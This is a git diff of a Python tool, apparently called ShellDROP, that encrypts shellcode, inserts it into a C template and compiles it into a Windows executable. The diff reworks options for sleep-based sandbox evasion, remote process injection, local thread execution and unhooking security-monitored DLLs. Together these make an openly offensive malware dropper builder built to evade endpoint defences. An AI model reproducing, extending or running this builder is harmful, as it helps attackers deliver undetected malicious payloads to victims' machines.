@@ -7,7 +7,9 @@ import secrets
 from jinja2 import Template
 
 
-BANNER =  """.d8888b.  888               888 888 8888888b.  8888888b.   .d88888b.  8888888b.
+BANNER =  \
+"""
+.d8888b.  888               888 888 8888888b.  8888888b.   .d88888b.  8888888b.
 d88P  Y88b 888               888 888 888  "Y88b 888   Y88b d88P" "Y88b 888   Y88b
 Y88b.      888               888 888 888    888 888    888 888     888 888    888
  "Y888b.   88888b.   .d88b.  888 888 888    888 888   d88P 888     888 888   d88P
@@ -16,6 +18,8 @@ Y88b.      888               888 888 888    888 888    888 888     888 888    88
 Y88b  d88P 888  888 Y8b.     888 888 888  .d88P 888  T88b  Y88b. .d88P 888
  "Y8888P"  888  888  "Y8888  888 888 8888888P"  888   T88b  "Y88888P"  888"""
 
+
+TEMPLATE_FILE = "template.c"
 
 def write_code(filename, content):
     """Writes the generated code to the given filename."""
@@ -28,6 +32,7 @@ def write_code(filename, content):
 
 def invoke_compiler(src_file, dst_file, compiler, compiler_options):
     """Compiles the previously compiled code to a .exe binary."""
+
     print("Compiling '{}' to '{}'...".format(src_file, dst_file))
     res = os.system("'{}' '{}' -o '{}' {}".format(compiler, src_file, dst_file, compiler_options))
     if res == 0:
@@ -66,14 +71,14 @@ def load_template(filename):
         return f.read()
 
 
-def generate_code(shellcode, key, config_options):
+def generate_code(shellcode, key, config_options, template_file_path):
     """Generates the C++ code where the payload will be set."""
 
     # Calculates the actual length of the shellcode and the key.  There will always be 4 bytes received for every actual byte in the payload.
     shellcode_length = int(len(shellcode) / 4)
     key_length = int(len(key) / 4)
 
-    template = Template(load_template("template.c"))
+    template = Template(load_template(template_file_path))
     return template.render({"shellcode_length": shellcode_length,
                             "key_length": key_length,
                             "shellcode": shellcode,
@@ -91,6 +96,8 @@ def convert_hex_string_to_bytes(string):
     mid = string.replace('\\x', '')
     return bytearray.fromhex(mid)
 
+def self_dir():
+    return os.path.dirname(os.path.realpath(__file__))
 
 def main():
 
@@ -151,7 +158,7 @@ def main():
     elif args.key_ascii:
         key = args.key_ascii.encode('ascii')
     else:
-        print("Error: either the --key or the --random-key needs to be provided.")
+        print("Error: either the --key or the --key-random argument needs to be provided.")
         sys.exit(-1)
 
     if args.verbose:
@@ -169,22 +176,32 @@ def main():
 
     code_config = {}
 
+    # Adds the sleep at the beginning of the execution.
     if args.sleep_evasion > 0:
         code_config["sleep_evasion"] = args.sleep_evasion
 
-    if args.local_thread_execution and args.remote_inject_executable:
-        code_config["local_thread_execution"] = args.local_thread_execution
+    # Adds the remote injection capability as required.
+    if args.remote_inject and args.remote_inject_executable:
+        code_config["remote_inject"] = args.remote_inject
         code_config["remote_inject_executable"] = args.remote_inject_executable
+    # Otherwise, add the local thread execution.
+    elif args.local_thread_execution:
+        code_config["local_thread_execution"] = args.local_thread_execution
+    else:
+        print("No execution method set!  Please use a local thread execution or a remote process injection.")
+        sys.exit(-2)
 
+    # Gets the DLLs to be unhooked at runtime.
     if args.unhook_dll and len(args.unhook_dll) > 0:
         code_config["unhook_dll"] = args.unhook_dll
 
-    # Generates the C++ code.
-    generated_code = generate_code(hex_encrypted_shellcode, hex_key, code_config)
-
     # Creates our file names.
+    template_path = os.path.join(self_dir(), TEMPLATE_FILE)
     c_file = "{}.c".format(args.output_file)
     exe_file = "{}.exe".format(args.output_file)
+
+    # Generates the C++ code.
+    generated_code = generate_code(hex_encrypted_shellcode, hex_key, code_config, template_path)
 
     # Writes the code to the .c file.
     write_code(c_file, generated_code)
@@ -195,8 +212,6 @@ def main():
     # If we are not in verbose mode, we remove the temporary .c file.
     if not args.verbose:
         remove_code(c_file)
-
-
 
 
 if __name__ == "__main__":
